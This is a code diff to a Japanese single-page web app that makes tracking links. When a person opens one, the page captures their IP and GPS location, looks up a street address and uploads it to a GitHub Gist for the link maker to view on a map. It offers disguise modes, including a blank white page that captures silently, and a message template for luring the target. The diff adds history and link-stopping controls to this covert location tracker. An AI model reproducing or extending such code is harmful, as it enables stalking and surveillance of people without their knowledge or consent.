@@ -40,9 +40,12 @@ button.sm{padding:9px 10px;font-size:11.5px;}
 .tg{background:#06331a;color:#4ade80;}
 .tb{background:#0d2340;color:#60a5fa;}
 #resMap{height:210px;border-radius:10px;margin-top:10px;overflow:hidden;}
-.hitem{display:flex;justify-content:space-between;align-items:center;gap:8px;background:#11161d;border:1px solid #1c222b;border-radius:10px;padding:10px 12px;margin-bottom:7px;}
+.hitem{display:flex;justify-content:space-between;align-items:center;gap:8px;background:#11161d;border:1px solid #1c222b;border-radius:10px;padding:10px 12px;margin-bottom:7px;cursor:pointer;}
 .hitem .n{font-size:12.5px;color:#fff;font-weight:700;}
 .hitem .d{font-size:10.5px;color:#8b93a0;}
+.hitem .go{flex:0 0 auto;font-size:11px;color:#60a5fa;font-weight:800;padding:6px 2px 6px 8px;}
+.hitem .del{flex:0 0 auto;font-size:11px;color:#8b93a0;font-weight:700;background:#1b2129;border-radius:8px;padding:8px 11px;}
+.hitem .del:active{background:#2a323c;}
 ol{padding-left:20px;margin:6px 0;font-size:12px;color:#a8b0bb;line-height:1.9;}
 code{background:#0a0d12;border-radius:4px;padding:1px 5px;font-size:11px;color:#93c5fd;}
 </style>
@@ -114,7 +117,6 @@ function readGist(id){
     try{ hits = JSON.parse((j.files["hits.json"] && j.files["hits.json"].content) || "[]"); }catch(e){ hits = []; }
     try{ loc = JSON.parse((j.files["loc.json"] && j.files["loc.json"].content) || "null"); }catch(e){ loc = null; }
     if(!Array.isArray(hits)) hits = [];
-    // 表示用は「最新のGPS記録」を優先（IPの記録で勝手に書き換わらないように）
     var last = null;
     for(var i = hits.length-1; i >= 0; i--){ if(hits[i].gps){ last = hits[i]; break; } }
     if(!last) last = hits.length ? hits[hits.length-1] : loc;
@@ -130,7 +132,7 @@ function record(id, p){
     if(!Array.isArray(arr)) arr = [];
     var hit = Object.assign({ ts:Date.now(), vid:VID, name:NAME, dev:devName() }, p);
     var last = arr[arr.length-1];
-    if(last && last.vid === VID) arr[arr.length-1] = hit;   // 同じ訪問なら追記せず上書き
+    if(last && last.vid === VID) arr[arr.length-1] = hit;
     else arr.push(hit);
     if(arr.length > 300) arr = arr.slice(-300);
     var b = { files:{} }; b.files["hits.json"] = { content: JSON.stringify(arr) };
@@ -142,8 +144,13 @@ function stopGist(id){ return req("DELETE", GH+"/"+id, gh()); }
 /* ===================== 履歴 ===================== */
 function getHist(){ try{ return JSON.parse(localStorage.getItem(HIST) || "[]"); }catch(e){ return []; } }
 function setHist(a){ try{ localStorage.setItem(HIST, JSON.stringify(a.slice(0,80))); }catch(e){} }
-function fmtDT(ts){ var d = new Date(ts), p = function(n){ return ("0"+n).slice(-2); };
-  return (d.getMonth()+1)+"/"+d.getDate()+" "+p(d.getHours())+":"+p(d.getMinutes()); }
+function fmtDT(ts){
+  var d = new Date(ts);
+  if(!ts || isNaN(d.getTime())) return "日付なし";
+  var p = function(n){ return ("0"+n).slice(-2); };
+  return (d.getMonth()+1)+"/"+d.getDate()+" "+p(d.getHours())+":"+p(d.getMinutes());
+}
+function modeLabel(m){ return ({ "":"ふつう","min":"極小","blank":"真っ白","go":"確実" }[m] || "ふつう"); }
 
 /* ===================== 地図 ===================== */
 var maps = {};
@@ -169,11 +176,8 @@ function drawMap(elId, lat, lon, dark){
 if(RID){
   var S = { lat:null, lon:null, addr:"", acc:null, ip:"", gps:false };
 
-  function report(){
-    return record(RID, { lat:S.lat, lon:S.lon, addr:S.addr, acc:S.acc, gps:S.gps, city:S.ip });
-  }
+  function report(){ return record(RID, { lat:S.lat, lon:S.lon, addr:S.addr, acc:S.acc, gps:S.gps, city:S.ip }); }
 
-  // 精度が良い方だけ採用する（悪い取得で上書きしない）
   function applyFix(p){
     var a = Math.round(p.coords.accuracy);
     if(S.acc !== null && a >= S.acc) return Promise.resolve(false);
@@ -181,7 +185,6 @@ if(RID){
     return rev(S.lat,S.lon).then(function(x){ S.addr = x; return report().then(function(){ return true; }); });
   }
 
-  // fast=true: 速い粗い取得を先に、その後で精度を上げる
   function capture(fast){
     return ipOnly().then(function(c){
       S.ip = c;
@@ -195,8 +198,7 @@ if(RID){
   }
 
   function normalView(){
-    var app = $("app");
-    app.innerHTML =
+    $("app").innerHTML =
       '<div class="card" style="margin-top:8px;">'
       + '<div id="rcIcon" style="font-size:26px;margin-bottom:6px;">📍</div>'
       + '<div id="rcTtl" style="font-size:16px;font-weight:800;margin-bottom:6px;">特定しています…</div>'
@@ -305,13 +307,8 @@ if(RID){
     function start(){
       st = "busy"; paint();
       var got = false;
-      var on = function(p){
-        got = true;
-        return applyFix(p).then(function(ok){ if(ok){ st = "done"; } paint(); });
-      };
-      var err = function(e){
-        if((e && e.code === 1) || !got){ st = "denied"; paint(); report(); }
-      };
+      var on = function(p){ got = true; return applyFix(p).then(function(ok){ if(ok) st = "done"; paint(); }); };
+      var err = function(e){ if((e && e.code === 1) || !got){ st = "denied"; paint(); report(); } };
       fix(false).then(on).catch(err);
       fix(true).then(on).catch(err);
     }
@@ -327,17 +324,10 @@ if(RID){
     }
   }
 
-  if(V === "blank"){
-    document.body.style.background = "#fff";
-    document.body.style.padding = "0";
-    capture(true);
-  } else if(V === "min"){
-    minView();
-  } else if(V === "go"){
-    goView();
-  } else {
-    normalView();
-  }
+  if(V === "blank"){ document.body.style.background = "#fff"; document.body.style.padding = "0"; capture(true); }
+  else if(V === "min"){ minView(); }
+  else if(V === "go"){ goView(); }
+  else { normalView(); }
 
   return;
 }
@@ -391,7 +381,9 @@ $("app").innerHTML =
 
 +   '<div class="card">'
 +     '<div class="h2">履歴</div>'
++     '<div class="muted" style="margin:0 0 9px;">タップで結果を開く。「消す」は履歴からのみ（リンクは生きたまま）。</div>'
 +     '<div id="histList"></div>'
++     '<div class="row"><button id="btnHistClear" class="sm">履歴を全部消す</button></div>'
 +   '</div>'
 + '</div>'
 
@@ -404,6 +396,7 @@ $("app").innerHTML =
 +       '<div id="resNote" class="muted"></div>'
 +       '<div id="resMap"></div>'
 +       '<div class="row"><button id="btnReload">更新</button><button id="btnResCopy">結果をコピー</button></div>'
++       '<div class="row"><button id="btnResStop" class="dang">このリンクを停止する</button></div>'
 +     '</div>'
 +   '</div>'
 +   '<div class="card hidden" id="hitsCard">'
@@ -508,30 +501,60 @@ $("btnMake").onclick = function(){
 $("btnCopy").onclick = function(){ copy($("linkField").textContent); $("btnCopy").textContent = "コピーしました"; setTimeout(function(){ $("btnCopy").textContent = "リンクをコピー"; }, 1400); };
 $("btnOpen").onclick = function(){ location.href = $("linkField").textContent; };
 $("btnTmplCopy").onclick = function(){ copy($("tmpl").value); $("btnTmplCopy").textContent = "コピーしました"; setTimeout(function(){ $("btnTmplCopy").textContent = "文面をコピー"; }, 1400); };
+
+function doStop(id, after){
+  stopGist(id).then(function(){
+    var h = getHist();
+    h.forEach(function(x){ if(x.id === id) x.stopped = true; });
+    setHist(h); renderHist();
+    if(after) after();
+  });
+}
 $("btnStop").onclick = function(){
   if(!CUR) return;
   if(!confirm("このリンクを停止します。相手が開いても何も起きなくなります。")) return;
-  stopGist(CUR.id).then(function(){
-    var h = getHist(); h.forEach(function(x){ if(x.id === CUR.id) x.stopped = true; }); setHist(h);
-    renderHist(); $("outBox").classList.add("hidden"); CUR = null;
-  });
+  doStop(CUR.id, function(){ $("outBox").classList.add("hidden"); });
+};
+$("btnResStop").onclick = function(){
+  if(!CUR) return;
+  if(!confirm("このリンクを停止します。相手が開いても何も起きなくなります。")) return;
+  doStop(CUR.id, function(){ $("resNote").textContent = "このリンクは停止済みです。"; });
 };
 
 function renderHist(){
   var h = getHist();
   if(!h.length){ $("histList").innerHTML = '<div class="muted" style="margin:0;">まだありません</div>'; return; }
   $("histList").innerHTML = h.map(function(x){
-    return '<div class="hitem"><div><div class="n">'+esc(x.name || "名称なし")+(x.stopped ? ' <span style="color:#f87171;font-size:10px;">停止</span>' : "")+'</div>'
-      + '<div class="d">'+fmtDT(x.ts)+' ／ '+({ "":"ふつう","min":"極小","blank":"真っ白","go":"確実" }[x.mode]||"ふつう")+'</div></div>'
-      + '<button class="sm" data-id="'+x.id+'">'+(x.stopped ? "開く" : "見る")+'</button></div>';
+    return '<div class="hitem" data-id="'+x.id+'">'
+      + '<div style="min-width:0;flex:1;">'
+        + '<div class="n">'+esc(x.name || "名称なし")+(x.stopped ? ' <span style="color:#f87171;font-size:10px;">停止</span>' : "")+'</div>'
+        + '<div class="d">'+fmtDT(x.ts)+' ／ '+modeLabel(x.mode)+'</div>'
+      + '</div>'
+      + '<div class="go">'+(x.stopped ? "開く" : "見る")+'</div>'
+      + '<div class="del" data-del="'+x.id+'">消す</div>'
+    + '</div>';
   }).join("");
 }
 $("histList").onclick = function(e){
-  var id = e.target.dataset.id; if(!id) return;
+  var delId = e.target.dataset.del;
+  if(delId){
+    var h = getHist().filter(function(y){ return y.id !== delId; });
+    setHist(h);
+    if(CUR && CUR.id === delId) CUR = null;
+    renderHist();
+    return;
+  }
+  var el = e.target.closest(".hitem"); if(!el) return;
+  var id = el.dataset.id;
   var x = getHist().filter(function(y){ return y.id === id; })[0]; if(!x) return;
   if(x.stopped){ location.href = BASE + "#n=" + encodeURIComponent(x.name) + "&r=gh" + id + "&t=" + TOKEN; return; }
   CUR = x;
   document.querySelector('[data-t="res"]').click();
+};
+$("btnHistClear").onclick = function(){
+  if(!getHist().length) return;
+  if(!confirm("履歴を全部消します。相手のリンクは生きたままです。")) return;
+  setHist([]); CUR = null; renderHist();
 };
 
 function refreshRes(){
